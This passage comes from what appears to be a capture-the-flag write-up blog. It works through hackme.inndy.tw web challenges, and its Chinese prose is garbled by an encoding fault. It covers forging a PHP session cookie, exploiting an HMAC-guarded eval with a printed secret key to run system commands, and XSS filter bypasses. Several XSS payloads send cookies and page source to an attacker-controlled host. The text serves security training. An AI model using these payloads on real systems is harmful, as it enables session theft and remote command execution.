class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span>is_admin<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>B<span class="number">%7</span>D</span><br></pre></td></tr></table></figure><p><strong>login8sha512</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>feb<span class="number">33685e47</span><span class="keyword">c</span><span class="number">83</span>ce<span class="number">089</span>b<span class="number">1707</span>f<span class="number">270001</span>a<span class="number">8</span>dc<span class="number">0648</span>d<span class="number">4</span>a<span class="number">7</span>d<span class="number">94</span>d<span class="number">0</span>a<span class="number">3e2</span>f<span class="number">5</span>b<span class="number">35803</span>a<span class="number">7</span><span class="keyword">c</span><span class="number">8766285283415</span><span class="keyword">c</span><span class="number">8594e658468</span>cf<span class="number">5e99</span>be<span class="number">232</span>b<span class="number">3</span>bf<span class="number">98</span>a<span class="number">441568</span>a<span class="number">71</span>f<span class="number">709243e9077</span></span><br></pre></td></tr></table></figure><p>å‘ç°ï¼Œ<code>sha512</code> çš„å€¼ç›´æ¥æ˜¯ <code>cookie</code> çš„æ‚å‡‘å€¼ï¼Œæ²¡æœ‰åŠ å¯†ï¼Œæ²¡æœ‰åŠ ç›ï¼ŒåŒæ—¶æ”¹å°± OK äº†ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸èƒ½ URL è§£ç åç›´æ¥å¤åˆ¶å» hashï¼Œè¿™æ ·ä¼šä¸¢å¤±ä¸€äº›ä¸å¯è§å­—ç¬¦ <code>%00</code>ã€‚</p><h2 id="login-as-admin-8-1"><a href="#login-as-admin-8-1" class="headerlink" title="login as admin 8.1"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8.1</a></h2><blockquote><p>login as admin and grab the hidden flag</p></blockquote><p>æ³¨æ„åˆ°ä¸Šé¢çš„ <code>cookie</code> ä¸­è¿˜æœ‰ <code>debug</code> é€‰é¡¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, urllib.parse</span><br><span class="line">en = <span class="string">"""O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D"""</span></span><br><span class="line">print(hashlib.sha512((urllib.parse.unquote(en)).encode()).hexdigest())</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lo6mueh3j20jv08nglt.jpg" alt></p><h2 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 1</a></h2><blockquote><p>Login as guest and find flag 1</p></blockquote><p><code>guest</code> ç™»å½•çœ‹çœ‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œè¿˜ç»™äº†æºç ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lodixl9mj20vf0hn0v5.jpg" alt></p><h2 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 2</a></h2><blockquote><p>Try to login as admin! and you will get flag2</p></blockquote><p>å…ˆç®€å•çš„å®¡è®¡ä¸€ç•ªï¼Œå‘ç°å¹¶æ²¡ç”¨åˆ°æ•°æ®åº“ï¼Œç”¨æˆ·ä¿¡æ¯æ˜¯ç”¨æ–‡ä»¶å­˜å‚¨çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"guest"</span>, </span><br><span class="line">        <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, </span><br><span class="line">        <span class="string">"./data/guest"</span>, </span><br><span class="line">        <span class="string">"https://game1.security.ntu.st/data/guest"</span>, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="string">"^.ht"</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span></span><br><span class="line">    ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>æ²¡æ•°æ®åº“å°±ä¸éœ€è¦è€ƒè™‘ <code>sqli</code> äº†ï¼Œç›´æ¥æƒ³åŠæ³•è¯»æ–‡ä»¶ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m7vaxjiqj20sl07t75a.jpg" alt></p><p>æ•æ„Ÿå‡½æ•°å¤§è‡´åœ¨è¿™ï¼Œä¸€ä¸ªä¸€ä¸ªçœ‹ä¸‹ã€‚</p><p><strong>fun_down.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"><span class="comment">// è·Ÿè¿› get_show_item</span></span><br><span class="line"><span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// è¿™ä¸ªåˆ¤æ–­å¤ªå¼±äº†ï¼Œä¸ç”¨ç®¡</span></span><br><span class="line"><span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;  <span class="comment">// show_hidden=1</span></span><br><span class="line">    $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">    <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å½¢æˆå®Œæ•´è·¯å¾„</span></span><br><span class="line">$abs_item = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™é‡Œåˆ¤æ–­äº†æ˜¯å¦æœ‰ .php / configï¼Œä¸å¤ªå¥½è¿‡ï¼Œå†å»çœ‹çœ‹å…¶ä»–ç‚¹</span></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p><strong>fun_edit.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™é‡Œæ²¡äº†ä¹‹å‰é‚£ä¸ªåˆºå¤´</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"></span><br><span class="line">$fname = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) </span><br><span class="line">    show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆå°è¯•è¯»å– <code>index.php</code> ï¼Œç¡®å®šå¥½ç›¸å¯¹è·¯å¾„åå†è¯»è¿™ä¸ªé…ç½®æ–‡ä»¶ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m8dzr3brj20yo0j3djb.jpg" alt></p><p>ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•å³å¯çœ‹åˆ° flagã€‚</p><h2 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 3</a></h2><blockquote><p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p></blockquote><p>ä¹‹å‰çœ‹æºç çš„æ—¶å€™ï¼Œç•™æ„åˆ°ä¸€ä¸ª <code>debug</code> çš„åœ°æ–¹ï¼Œè€Œä¸”ä¹Ÿæ‰«å‡ºæ¥äº† <code>eval</code>ã€‚</p><p>å®šä½åˆ° <code>fun_debug.php</code> ï¼Œä¹Ÿå¯ä»¥å°è¯•ä¸‹ä¼ ä¸ª <code>webshell</code>ä¸Šå»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="comment">// ä¼ ä¸ªæ•°ç»„è¿‡äº†</span></span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;  <span class="comment">// è¿‡æ»¤å¤ªå¼±äº†</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å‘½ä»¤æ³¨å…¥çš„å¥—è·¯äº†ï¼Œå’±ä»¬å¼¹ä¸ª <code>shell</code> ç©ç©ã€‚ <a href="https://www.anquanke.com/post/id/168667" target="_blank" rel="noopener">å¦‚ä½•è¿œç¨‹åˆ©ç”¨PHPç»•è¿‡Filterä»¥åŠWAFè§„åˆ™</a></p><p>å¼¹äº†åŠå¤©æ²¡å¼¹å‡ºæ¥ï¼Œä¼°è®¡åšäº†ä»€ä¹ˆè®¾ç½®ï¼Œè¿˜æ˜¯è€è€å®å®è¯»æ–‡ä»¶å§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'ls -al\');'</span>);</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbaypcbqj20yo0cdtav.jpg" alt></p><p>å‘ç° <code>flag3</code> è¿™ä¸ªç›®å½•ï¼Œçœ‹çœ‹é‡Œé¢æœ‰å•¥ä¸œè¥¿ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbd1c4sdj20qs09tgn9.jpg" alt></p><p> <code>root</code> æ‰èƒ½è¯» <code>flag3</code> ï¼Œæœ‰ç‚¹ææƒçš„å‘³é“äº†ã€‚å…ˆçœ‹çœ‹ <code>meow.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *exec = argv[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *flag = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Usage: %s flag\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"We have cat to read file, And the meow to cat flag."</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">S</span>;</span></span><br><span class="line"><span class="keyword">if</span>(stat(exec, &amp;S) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Can not stat file %s\n"</span>, exec);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> uid = S.st_uid;</span><br><span class="line"><span class="keyword">gid_t</span> gid = S.st_gid;</span><br><span class="line"></span><br><span class="line">setuid(uid);</span><br><span class="line">seteuid(uid);</span><br><span class="line">setgid(gid);</span><br><span class="line">setegid(gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(flag, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Can not open file %s\n"</span>, flag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ssize_t</span> readed = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(readed &gt; <span class="number">0</span>) &#123;</span><br><span class="line">write(<span class="number">1</span>, buffer, readed);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£å°±ç”¨è¿™ä¸ªç¨‹åºè¯» <code>flag</code> å§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'./flag3/meow ./flag3/flag3\');'</span>);</span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><a href="https://webshell.hackme.inndy.tw/" target="_blank" rel="noopener">webshell</a></h2><p>è¿™é¢˜æŒ‚æ‰äº†ï¼Œä¿®å¤äº†å†åšã€‚</p><h2 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a><a href="https://command-executor.hackme.inndy.tw/" target="_blank" rel="noopener">command-executor</a></h2><p>å•ç‹¬å†™ wp</p><h2 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssme</a></h2><blockquote><p>XSS admin to steal flag</p></blockquote><p>éƒ½å¼ºè°ƒäº† <code>xss</code> ï¼Œé‚£å°±æ˜¯æ‰“ç®¡ç†å‘˜ <code>cookie</code> äº†ã€‚</p><p>ä¸è¿‡è¿˜æ˜¯æ‰«ä¸€éç›®å½•çœ‹çœ‹ï¼Œä»¥é˜²ä¸¢å¤±é‡è¦ä¿¡æ¯ã€‚</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w1ga3d3gj20a904bwew.jpg" alt></p><p>ä¸€ç™»å½•è¿›æ¥å°±å‘ç°æ˜¯ä¸ªé‚®ç®±ç®¡ç†ç•Œé¢ï¼Œè€Œä¸”<code>admin</code> å·²ç»å‘äº†å°æ¬¢è¿é‚®ä»¶è¿‡æ¥ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯ç»™ <code>admin</code> å‘å°é‚®ä»¶ï¼Œæ’å…¥å’±ä»¬çš„ <code>js</code> payloadï¼ŒæŠŠ <code>cookie</code> å·è¿‡æ¥ã€‚ </p><p>è¿™é‡Œæœ‰ä¸ªå¾ˆæœ‰è¶£çš„ç‚¹ï¼Œå¯ä»¥è‡ªå·±ç»™è‡ªå·±å‘é‚®ä»¶ï¼Œè¿™æ ·å°±å®Œå…¨ä¸ç”¨æ€€ç–‘ <code>bot</code> ä¼šå‡ºæ•…éšœï¼Œè‡ªå·±æ‰“è‡ªå·±æˆåŠŸäº†å†å»æ‰“ç®¡ç†å‘˜æ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚</p><p>é¢˜ç›®å¾ˆå‹å¥½ï¼Œç›´æ¥æç¤ºäº†å“ªäº›å­—ç¬¦ä¸èƒ½ç”¨ï¼Œè€Œä¸”æ˜¾ç¤ºäº†ç®¡ç†å‘˜æ˜¯å¦é˜…è¯»äº†è¯¥é‚®ä»¶ã€‚</p><p>ç®€å•å°è¯•äº†ä¸€ä¸‹ï¼Œä»¥ä¸‹å­—ç¬¦è¢«è¿‡æ»¤ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">script</span></span><br><span class="line">)</span><br><span class="line">onmouseover</span><br><span class="line">ç©ºæ ¼onload</span><br><span class="line">ç©ºæ ¼onerror</span><br><span class="line">&lt;iframe</span><br></pre></td></tr></table></figure><p>ä½†è¿˜æœ‰ä¸ªå¸¸ç”¨çš„ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">onload</span>=alert(1);&gt;</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=alert(1)&gt;</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=prompt(1)</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure><p>æ„é€  <code>payload</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location='//vps_ip:9999?cookie='+document.cookie"</span>&gt;</span><br><span class="line"></span><br><span class="line">æˆ–è€…å°† <span class="string">""</span> å†…çš„å†…å®¹ HTML å®ä½“ç¼–ç ä¸‹</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location.href=('//vps_ip:9999?cookie='+document.cookie)"</span>&gt;</span><br><span class="line"></span><br><span class="line">å¦‚æœæ²¡å‘ç°ä¸Šé¢ä¸€äº›è¿‡æ»¤æ˜¯åŒ…å«ç©ºæ ¼ä¸€èµ·æ£€æµ‹çš„ï¼Œå°†å¤±å»å¤§é‡åˆé€‚ payload</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">""</span>onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ xss å¹³å°æ¥æ”¶ä¸€ä¸‹è¯·æ±‚ï¼Œæˆ–è€…ç›´æ¥ç”¨ nc ç›‘å¬ã€‚</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g2w107xescj20ml04sjrq.jpg" alt></p><h2 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a><a href="https://xssrf.hackme.inndy.tw/" target="_blank" rel="noopener">xssrf leak</a></h2><blockquote><p>Steal flag from source code file</p></blockquote><p>æç¤ºæ˜¯ flag åœ¨æºç é‡Œé¢ï¼Œé‚£æˆ‘ä»¬å…ˆè¯»ä¸€ä¸‹é¡µé¢çš„æºä»£ç çœ‹çœ‹ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"javascript:document.location='//vps_ip:9999?cookie='+btoa(document.body.innerHTML)"</span>&gt;</span><br><span class="line"></span><br><span class="line">å‘ç° innerHTML è¢«è¿‡æ»¤ï¼Œé‚£å°± HTML ç¼–ç ä¸€ä¸‹</span><br><span class="line">&lt;svg/<span class="attribute">onload</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x3d;&amp;#x27;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x2e;&amp;#x32;&amp;#x32;&amp;#x30;&amp;#x2e;&amp;#x32;&amp;#x34;&amp;#x31;&amp;#x3a;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x39;&amp;#x3f;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3d;&amp;#x27;&amp;#x2b;&amp;#x62;&amp;#x74;&amp;#x6f;&amp;#x61;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;&amp;#x2e;&amp;#x69;&amp;#x6e;&amp;#x6e;&amp;#x65;&amp;#x72;&amp;#x48;&amp;#x54;&amp;#x4d;&amp;#x4c;&amp;#x29;"</span>&gt;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° HTMLï¼Œæœ‰ç‚¹æ®‹ç¼ºï¼Œè‡ªå·±æ”¹ä¸‹æ ‡ç­¾ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-lg navbar-dark bg-dark d-flex"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>XSSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-itebSI </span></span></span><br><span class="line">      &lt;a class=" nav-link" href="sendmail.php"&gt;Send Mail&lt;L2E &lt;/li&gt; &lt;li class="nav-itebSI </span><br><span class="line">      &lt;a class=" nav-link" href="mailbox.php"&gt;Mailbox&lt;L2E &lt;/li&gt; 